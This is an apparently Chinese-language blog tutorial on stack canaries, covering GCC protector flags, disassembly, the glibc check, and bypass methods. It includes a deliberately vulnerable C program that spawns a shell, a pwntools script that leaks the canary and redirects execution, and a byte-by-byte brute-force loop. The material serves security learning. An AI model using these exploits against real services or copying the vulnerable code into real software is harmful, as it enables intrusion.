@@ -1,0 +1,281 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Canary | Rhea's Blog</title><meta name="author" content="Rhea"><meta name="copyright" content="Rhea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="介绍Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Canary">
+<meta property="og:url" content="https://rhea006.github.io/2025/07/0d840bbdb054.html">
+<meta property="og:site_name" content="Rhea&#39;s Blog">
+<meta property="og:description" content="介绍Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rhea006.github.io/img/w2.jpg">
+<meta property="article:published_time" content="2025-07-01T02:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-19T08:03:42.748Z">
+<meta property="article:author" content="Rhea">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rhea006.github.io/img/w2.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Canary",
+  "url": "https://rhea006.github.io/2025/07/0d840bbdb054.html",
+  "image": "https://rhea006.github.io/img/w2.jpg",
+  "datePublished": "2025-07-01T02:00:00.000Z",
+  "dateModified": "2025-07-19T08:03:42.748Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Rhea",
+      "url": "https://rhea006.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://rhea006.github.io/2025/07/0d840bbdb054.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Canary',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Rhea's Blog" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(/img/background1.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">65</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/w2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/logo.png" alt="Logo"><span class="site-name">Rhea's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Canary</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Canary</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-01T02:00:00.000Z" title="发表于 2025-07-01 10:00:00">2025-07-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-19T08:03:42.748Z" title="更新于 2025-07-19 16:03:42">2025-07-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/">Learning</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/5-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/">5-Linux安全机制</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/5-Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2-Stack-Canaries/">2-Stack Canaries</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护的目的。</p>
+<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="简单程序"><a href="#简单程序" class="headerlink" title="简单程序"></a>简单程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    char buf[10];</span><br><span class="line">    scanf(&quot;%s&quot;,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br><span class="line"># 无栈保护</span><br><span class="line">$ gcc -fno-stack-protector canary.c -o fno.out #gcc -fno-stack-protector -o no_canary canary.c</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./fno.out</span><br><span class="line">$ Segmentation fault (core dumped)</span><br><span class="line"># 基础/最强栈保护</span><br><span class="line">$ gcc -fstack-protector -o with_canary canary.c(gcc -fstack-protector-strong -o strong_canary canary.c) #gcc -fstack-protector canary.c -o f.out</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./f.out</span><br><span class="line">$ *** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br><span class="line">plaintext</span><br><span class="line"></span><br><span class="line"># 编译带canary保护的版本</span><br><span class="line">gcc -fstack-protector -o with_canary canary.c</span><br><span class="line"></span><br><span class="line"># 检查文件是否生成</span><br><span class="line">ls -l with_canary</span><br><span class="line">-rwxr-xr-x 1 ubuntu ubuntu 16024 Jun 30 16:13 with_canary</span><br><span class="line"></span><br><span class="line">gdb -q ./with_canary -ex &quot;disassemble main&quot; -ex &quot;q&quot;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:	endbr64</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:	push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:	sub    rsp,0x20</span><br><span class="line">   `0x0000000000001175 &lt;+12&gt;:	mov    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x000000000000117e &lt;+21&gt;:	mov    QWORD PTR [rbp-0x8],rax`</span><br><span class="line">   0x0000000000001182 &lt;+25&gt;:	xor    eax,eax</span><br><span class="line">   0x0000000000001184 &lt;+27&gt;:	lea    rax,[rbp-0x12]</span><br><span class="line">   0x0000000000001188 &lt;+31&gt;:	mov    rsi,rax</span><br><span class="line">   0x000000000000118b &lt;+34&gt;:	lea    rax,[rip+0xe72]        # 0x2004</span><br><span class="line">   0x0000000000001192 &lt;+41&gt;:	mov    rdi,rax</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:	mov    eax,0x0</span><br><span class="line">   0x000000000000119a &lt;+49&gt;:	call   0x1070 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:	nop</span><br><span class="line">   `0x00000000000011a0 &lt;+55&gt;:	mov    rax,QWORD PTR [rbp-0x8]`</span><br><span class="line">   `0x00000000000011a4 &lt;+59&gt;:	sub    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x00000000000011ad &lt;+68&gt;:	je     0x11b4 &lt;main+75&gt;`</span><br><span class="line">   `0x00000000000011af &lt;+70&gt;:	call   0x1060 &lt;__stack_chk_fail@plt&gt;`</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:	leave</span><br><span class="line">   0x00000000000011b5 &lt;+76&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h2><p>开启 Canary 保护的 stack 结构大概如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
+
+<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p>
+<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p>
+<p>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p>
+<h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p>
+<h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">// ex2.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void getshell(void) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void init() &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line">&#125;</span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">        read(0, buf, 0x200);</span><br><span class="line">        printf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    init();</span><br><span class="line">    puts(&quot;Hello Hacker!&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">$ gcc -m32 -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure>
+
+<p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &#x27;ex2&#x27;</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./ex2&#x27;)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line"></span><br><span class="line"># leak Canary</span><br><span class="line">payload = &quot;A&quot;*100</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;A&quot;*100)</span><br><span class="line">Canary = u32(io.recv(4))-0xa</span><br><span class="line">log.info(&quot;Canary:&quot;+hex(Canary))</span><br><span class="line"></span><br><span class="line"># Bypass Canary</span><br><span class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line"></span><br><span class="line">print &quot;[+] Brute forcing stack canary &quot;</span><br><span class="line"></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p)+8</span><br><span class="line"></span><br><span class="line">while len(p) &lt; stop:</span><br><span class="line">   for i in xrange(0,256):</span><br><span class="line">      res = send2server(p + chr(i))</span><br><span class="line"></span><br><span class="line">      if res != &quot;&quot;:</span><br><span class="line">         p = p + chr(i)</span><br><span class="line">         #print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br><span class="line">         break</span><br><span class="line"></span><br><span class="line">      if i == 255:</span><br><span class="line">         print &quot;[-] Exploit failed&quot;</span><br><span class="line">         sys.exit(-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-1:-1].encode(&quot;hex&quot;)</span><br><span class="line">print &quot;   [+] SSP value is 0x%s&quot; % canary</span><br></pre></td></tr></table></figure>
+
+<h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>
+<p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p>
+<h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>
+<p>参见 StarCTF2018 babystack</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://rhea006.github.io">Rhea</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://rhea006.github.io/2025/07/0d840bbdb054.html">https://rhea006.github.io/2025/07/0d840bbdb054.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://rhea006.github.io" target="_blank">Rhea's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/w2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/07/3f7bd9fc8b89.html" title="NX"><img class="cover" src="/img/w8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">NX</div></div><div class="info-2"><div class="info-item-1">简介 No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellcode时，CPU就会抛出异常。通常我们使用可执行空间保护(executable space 